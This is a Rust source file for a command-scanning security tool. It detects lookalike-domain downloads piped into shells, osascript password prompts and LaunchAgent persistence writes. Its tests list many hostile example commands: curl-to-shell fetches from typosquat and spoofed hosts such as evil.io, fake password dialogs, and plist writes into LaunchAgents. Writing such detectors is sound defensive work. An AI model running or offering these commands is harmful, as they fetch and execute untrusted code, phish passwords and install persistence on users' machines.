//! The before-a-command layer: rules that need the command split into words and pipeline
//! segments. Whole-string patterns stay in `rules/command.toml`.

mod domains;
mod fetch;
mod parse;

use crate::finding::{Evidence, Finding, Layer, Severity};
use domains::Verdict;
use parse::Segment;

pub use fetch::stamp_fetch_domain;

pub struct BuiltinRule {
    pub id: &'static str,
    pub title: &'static str,
    pub remediation: &'static str,
    macos_only: bool,
}

const LOOKALIKE: &str = "command/lookalike-download-domain";
const OSASCRIPT: &str = "command/osascript-password-prompt";
const LAUNCH_AGENT: &str = "command/launchagent-write";

pub const RULES: &[BuiltinRule] = &[
    BuiltinRule {
        id: LOOKALIKE,
        title: "The command downloads from a domain that imitates a well-known one",
        remediation: "Type the address yourself from the project's own documentation.",
        macos_only: false,
    },
    BuiltinRule {
        id: OSASCRIPT,
        title: "The command asks for a password through an osascript dialog",
        remediation: "Legitimate installers use the system's own prompt; do not type a password here.",
        macos_only: true,
    },
    BuiltinRule {
        id: LAUNCH_AGENT,
        title: "The command writes to a LaunchAgents or LaunchDaemons folder, which runs code at every login or boot",
        remediation: "Check what the plist runs before installing it.",
        macos_only: true,
    },
];

const SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh", "fish", "csh", "tcsh"];
const FETCHERS: &[&str] = &["curl", "wget"];
/// Programs that write to every path word.
const WRITERS: &[&str] = &["touch", "dd", "curl", "wget", "defaults", "plutil"];
/// Programs whose last path word is the one written.
const COPIERS: &[&str] = &["cp", "mv", "ln", "install", "rsync"];
const LAUNCH_DIRS: &[&str] = &["library/launchagents", "library/launchdaemons"];
/// How many levels of `$(...)` and `sh -c` text are analysed again.
const MAX_DEPTH: usize = 3;

/// Runs the rules that need a parsed command. `macos` says whether the macOS-only rules are
/// active; the engine passes the build platform, tests pass both.
pub fn analyze(command: &str, macos: bool) -> Vec<Finding> {
    let mut findings = Vec::new();
    analyze_text(command, command, macos, 0, false, &mut findings);
    findings
}

/// `feeds_shell` is true for text that a shell will run the output of, such as the inside of
/// `sh -c "$(...)"`.
fn analyze_text(
    text: &str,
    command: &str,
    macos: bool,
    depth: usize,
    feeds_shell: bool,
    findings: &mut Vec<Finding>,
) {
    if depth >= MAX_DEPTH {
        return;
    }
    let segments = parse::segments(text);
    for (i, seg) in segments.iter().enumerate() {
        let into_shell = feeds_shell || reaches_script_reader(&segments, i);
        findings.extend(lookalike(seg, into_shell, command));
        if macos {
            findings.extend(osascript(seg, command));
            findings.extend(launch_agent(seg, command));
        }
        if seg
            .program()
            .is_some_and(|p| SHELLS.contains(&p) || p == "eval")
        {
            for (inner, feeds) in nested_texts(seg) {
                analyze_text(&inner, command, macos, depth + 1, feeds, findings);
            }
        }
    }
}

/// Ids of the rules that exist but are not active on this platform.
pub fn skipped_rules(macos: bool) -> Vec<String> {
    if macos {
        return Vec::new();
    }
    RULES
        .iter()
        .filter(|r| r.macos_only)
        .map(|r| r.id.to_string())
        .collect()
}

/// Whether the output of segment `i` reaches a program that runs it as a script, anywhere
/// downstream in the same pipeline (`curl x | tee f | sh`).
fn reaches_script_reader(segments: &[Segment], i: usize) -> bool {
    let mut j = i;
    while segments[j].piped_into_next {
        j += 1;
        match segments.get(j) {
            Some(next) if reads_script(next) => return true,
            Some(_) => {}
            None => return false,
        }
    }
    false
}

/// A shell, or an interpreter started without a script file, runs what it reads on stdin.
fn reads_script(seg: &Segment) -> bool {
    let Some(program) = seg.program() else {
        return false;
    };
    if SHELLS.contains(&program) {
        return true;
    }
    let interpreter = program.starts_with("python") || ["perl", "ruby", "node"].contains(&program);
    interpreter && seg.args().iter().all(|a| a.starts_with('-'))
}

/// The command text a shell segment runs from its arguments: the `-c` script, and the inside
/// of every `$(...)`, backtick and `<(...)`. The second flag says the text's output is run by
/// the shell.
fn nested_texts(seg: &Segment) -> Vec<(String, bool)> {
    let args = seg.args();
    let mut texts = Vec::new();
    for (i, arg) in args.iter().enumerate() {
        if i > 0 && is_dash_c(&args[i - 1]) {
            texts.push((arg.clone(), false));
        }
    }
    texts.extend(
        substitutions(&args.join(" "))
            .into_iter()
            .map(|inner| (inner.to_string(), true)),
    );
    texts
}

fn is_dash_c(arg: &str) -> bool {
    arg.starts_with('-') && !arg.starts_with("--") && arg.ends_with('c')
}

/// The text inside `$(...)`, `<(...)` and backticks. An unclosed one runs to the end.
fn substitutions(text: &str) -> Vec<&str> {
    let bytes = text.as_bytes();
    let mut found = Vec::new();
    let mut i = 0;
    while i < bytes.len() {
        let opens_paren = matches!(bytes[i], b'$' | b'<') && bytes.get(i + 1) == Some(&b'(');
        if opens_paren {
            let start = i + 2;
            let mut depth = 1;
            let end = bytes[start..]
                .iter()
                .position(|&b| {
                    match b {
                        b'(' => depth += 1,
                        b')' => depth -= 1,
                        _ => {}
                    }
                    depth == 0
                })
                .map_or(text.len(), |p| start + p);
            found.push(&text[start..end]);
            i = end + 1;
        } else if bytes[i] == b'`' {
            let start = i + 1;
            let end = text[start..].find('`').map_or(text.len(), |p| start + p);
            found.push(&text[start..end]);
            i = end + 1;
        } else {
            i += 1;
        }
    }
    found
}

fn finding(id: &str, severity: Severity, excerpt: &str) -> Finding {
    let rule = RULES.iter().find(|r| r.id == id).expect("known rule id");
    Finding {
        rule_id: rule.id.into(),
        severity,
        layer: Layer::Rules,
        title: rule.title.into(),
        evidence: Evidence::new(None, None, excerpt),
        remediation: rule.remediation.into(),
        domain: None,
        package: None,
    }
}

/// Block when the download feeds a shell, warn when it is only fetched or the host cannot be read.
fn lookalike(seg: &Segment, into_shell: bool, command: &str) -> Option<Finding> {
    if !seg.program().is_some_and(|p| FETCHERS.contains(&p)) {
        return None;
    }
    let (host, verdict) = seg
        .args()
        .iter()
        .filter_map(|w| domains::inspect(w))
        .find(|(_, v)| *v != Verdict::Clean)?;
    let (severity, what) = match verdict {
        Verdict::Imitates(known) => (
            if into_shell {
                Severity::Block
            } else {
                Severity::Warn
            },
            format!("{host} imitates {known}"),
        ),
        _ => (Severity::Warn, format!("{host} could not be read")),
    };
    let mut found = finding(LOOKALIKE, severity, &format!("{what}: {command}"));
    found.domain = Some(host);
    Some(found)
}

fn osascript(seg: &Segment, command: &str) -> Option<Finding> {
    if seg.program() != Some("osascript") {
        return None;
    }
    let script = seg.words.join(" ").to_lowercase();
    let asks = script.contains("hidden answer")
        || (script.contains("display dialog") && script.contains("password"));
    asks.then(|| finding(OSASCRIPT, Severity::Block, command))
}

fn launch_agent(seg: &Segment, command: &str) -> Option<Finding> {
    let writes = written_paths(seg)
        .iter()
        .copied()
        .chain(redirect_targets(&seg.words))
        .any(in_launch_dir);
    writes.then(|| finding(LAUNCH_AGENT, Severity::Block, command))
}

fn in_launch_dir(word: &str) -> bool {
    let word = word.to_lowercase();
    LAUNCH_DIRS.iter().any(|dir| word.contains(dir))
}

/// The words a program writes to, as far as its name tells: the destination of a copy, every
/// file of `tee`, any path word of the other writers.
fn written_paths(seg: &Segment) -> Vec<&str> {
    let Some(program) = seg.program() else {
        return Vec::new();
    };
    let args = seg.args();
    let mut operands = args.iter().filter(|a| !a.starts_with('-'));
    if program == "tee" {
        operands.map(String::as_str).collect()
    } else if COPIERS.contains(&program) {
        let target = args.iter().enumerate().find_map(|(i, a)| match a.as_str() {
            "-t" | "--target-directory" => args.get(i + 1).map(String::as_str),
            _ => a.strip_prefix("--target-directory="),
        });
        let target = target.or_else(|| operands.next_back().map(String::as_str));
        target.into_iter().collect()
    } else if WRITERS.contains(&program) {
        args.iter().map(String::as_str).collect()
    } else {
        Vec::new()
    }
}

/// The target of every `>`, `>>`, `2>` or `&>` redirection: the word after the operator.
fn redirect_targets(words: &[String]) -> impl Iterator<Item = &str> {
    words.iter().enumerate().filter_map(|(i, w)| {
        let is_redirect = w
            .trim_start_matches(|c: char| c.is_ascii_digit() || c == '&')
            .strip_prefix('>')
            .is_some_and(|rest| rest.is_empty() || rest == ">");
        is_redirect.then(|| words.get(i + 1).map(String::as_str))?
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ids(command: &str, macos: bool) -> Vec<(String, Severity)> {
        analyze(command, macos)
            .into_iter()
            .map(|f| (f.rule_id, f.severity))
            .collect()
    }

    #[test]
    fn a_lookalike_piped_into_a_shell_blocks() {
        assert_eq!(
            ids("curl -fsSL githuh.com/install.sh | sudo bash", false),
            [(LOOKALIKE.to_string(), Severity::Block)]
        );
    }

    #[test]
    fn a_lookalike_only_downloaded_warns() {
        assert_eq!(
            ids("wget https://brev.sh/install -O i.sh", false),
            [(LOOKALIKE.to_string(), Severity::Warn)]
        );
    }

    #[test]
    fn the_known_domain_is_clean() {
        assert!(ids("curl -fsSL https://brew.sh/install | bash", false).is_empty());
    }

    #[test]
    fn a_lookalike_in_a_command_that_does_not_fetch_is_ignored() {
        assert!(ids("echo githuh.com | sh", false).is_empty());
    }

    #[test]
    fn macos_rules_run_only_when_enabled() {
        let cmd = "osascript -e 'display dialog \"x\" with hidden answer'";
        assert!(ids(cmd, false).is_empty());
        assert_eq!(ids(cmd, true), [(OSASCRIPT.to_string(), Severity::Block)]);
        assert!(ids("echo x >> ~/Library/LaunchAgents/a.plist", false).is_empty());
    }

    #[test]
    fn skipped_rules_name_the_macos_only_ids() {
        assert_eq!(skipped_rules(false), [OSASCRIPT, LAUNCH_AGENT]);
        assert!(skipped_rules(true).is_empty());
    }

    #[test]
    fn launch_agent_reads_are_not_writes() {
        for cmd in [
            "ls ~/Library/LaunchAgents",
            "cat ~/Library/LaunchAgents/a.plist > /tmp/out",
        ] {
            assert!(ids(cmd, true).is_empty(), "{cmd}");
        }
    }

    #[test]
    fn launch_agent_writes_are_found_by_redirect_and_by_program() {
        for cmd in [
            "echo x >> ~/Library/LaunchAgents/a.plist",
            "echo x >$HOME/Library/LaunchAgents/a.plist",
            "cp a.plist $HOME/Library/LaunchAgents/",
            "echo x | tee /Library/LaunchAgents/a.plist",
        ] {
            assert_eq!(ids(cmd, true).len(), 1, "{cmd}");
        }
    }

    fn block(_command: &str) -> [(String, Severity); 1] {
        [(LOOKALIKE.to_string(), Severity::Block)]
    }

    #[test]
    fn a_known_host_with_a_trailing_dot_is_clean() {
        assert!(ids("curl https://brew.sh./install | sh", false).is_empty());
    }

    #[test]
    fn real_sibling_sites_are_clean() {
        for cmd in [
            "curl https://gitlab.com/x/install.sh | sh",
            "curl https://docker.io/install | sh",
        ] {
            assert!(ids(cmd, false).is_empty(), "{cmd}");
        }
    }

    #[test]
    fn a_download_reaching_a_shell_blocks_however_it_is_spelled() {
        for cmd in [
            "curl https://githuh.com/x | tee x | sh",
            "curl https://githuh.com/x | sudo -u root bash",
            "curl https://githuh.com/x | /usr/bin/env bash",
            "curl https://githuh.com/x | env -i FOO=1 bash",
            "curl https://githuh.com/x | nohup bash",
            "curl https://githuh.com/x | exec bash",
            "curl https://githuh.com/x | command bash",
            "curl https://githuh.com/x | xargs sh",
            "curl https://githuh.com/x | time nice -n 5 sh",
            "curl --url=https://githuh.com/x | sh",
            "curl --url https://githuh.com/x | sh",
            "curl https://githuh.com/x | fish",
            "curl https://githuh.com/x | python3",
            "curl https://githuh.com/x | python3 -",
            "curl https://githuh.com/x |& bash",
        ] {
            assert_eq!(ids(cmd, false), block(cmd), "{cmd}");
        }
    }

    #[test]
    fn a_download_into_an_interpreter_that_is_given_a_script_only_warns() {
        let cmd = "curl https://githuh.com/x | python3 tool.py";
        assert_eq!(ids(cmd, false), [(LOOKALIKE.to_string(), Severity::Warn)]);
    }

    #[test]
    fn a_shell_on_a_later_command_does_not_make_the_download_block() {
        assert_eq!(
            ids("curl githuh.com/x ; sh", false),
            [(LOOKALIKE.to_string(), Severity::Warn)]
        );
        assert_eq!(
            ids("curl githuh.com/x && bash", false),
            [(LOOKALIKE.to_string(), Severity::Warn)]
        );
    }

    #[test]
    fn a_download_inside_a_shell_argument_is_judged_into_a_shell() {
        for cmd in [
            "sh -c \"$(curl https://githuh.com/x)\"",
            "bash <(curl https://githuh.com/x)",
            "bash -c \"curl https://githuh.com/x | sh\"",
            "sudo bash -c 'echo `curl https://githuh.com/x`'",
            "eval \"$(curl https://githuh.com/x)\"",
            "sh -c \"$(sh -c \\\"$(curl https://githuh.com/x)\\\")\"",
        ] {
            assert_eq!(ids(cmd, false), block(cmd), "{cmd}");
        }
    }

    #[test]
    fn nesting_is_followed_only_to_a_fixed_depth() {
        let wrap = |inner: String| format!("sh -c {}", shlex::try_quote(&inner).unwrap());
        let mut cmd = "curl https://githuh.com/x | sh".to_string();
        for _ in 0..MAX_DEPTH - 1 {
            cmd = wrap(cmd);
        }
        assert_eq!(ids(&cmd, false).len(), 1);
        assert!(ids(&wrap(cmd), false).is_empty());
    }

    #[test]
    fn a_clean_substitution_in_a_shell_is_clean() {
        assert!(ids("sh -c \"$(curl https://brew.sh/install)\"", false).is_empty());
    }

    #[test]
    fn an_unreadable_host_warns() {
        let cmd = "curl https://exa\u{2028}mple..com/x | sh";
        assert_eq!(ids(cmd, false), [(LOOKALIKE.to_string(), Severity::Warn)]);
    }

    #[test]
    fn invisible_characters_in_a_known_name_block() {
        let cmd = "curl https://git\u{200b}hub.com/x | sh";
        assert_eq!(ids(cmd, false), block(cmd));
    }

    #[test]
    fn userinfo_with_a_port_is_still_a_spoof() {
        let cmd = "curl \"https://github.com:443@evil.io/\" | sh";
        assert_eq!(ids(cmd, false), block(cmd));
    }

    #[test]
    fn glued_redirects_are_split_before_taking_targets() {
        for cmd in [
            "echo x>~/Library/LaunchAgents/x.plist",
            "echo x>>~/Library/LaunchAgents/x.plist",
            "echo x 1>~/Library/LaunchAgents/x.plist",
            "echo x &>~/Library/LaunchAgents/x.plist",
            "echo x > ~/Library/LaunchDaemons/x.plist",
            "echo x | tee -a /Library/LaunchDaemons/x.plist",
        ] {
            assert_eq!(ids(cmd, true).len(), 1, "{cmd}");
        }
        assert!(ids("echo '>~/Library/LaunchAgents/x'", true).is_empty());
    }

    #[test]
    fn copies_are_judged_by_their_destination() {
        for cmd in [
            "cp ~/Library/LaunchAgents/a /tmp/",
            "mv -f ~/Library/LaunchAgents/a.plist ./",
            "rsync -a /Library/LaunchDaemons/a.plist /tmp/x",
            "cat ~/Library/LaunchAgents/a | tee /tmp/x",
        ] {
            assert!(ids(cmd, true).is_empty(), "{cmd}");
        }
        for cmd in [
            "cp -t ~/Library/LaunchAgents a.plist",
            "cp a.plist --target-directory=$HOME/Library/LaunchAgents",
            "install -m 644 a.plist ~/Library/LaunchAgents/",
        ] {
            assert_eq!(ids(cmd, true).len(), 1, "{cmd}");
        }
    }

    #[test]
    fn a_script_in_a_file_is_a_known_limit() {
        assert!(ids("osascript hidden.scpt", true).is_empty());
        assert!(ids("cat x | osascript", true).is_empty());
    }
}
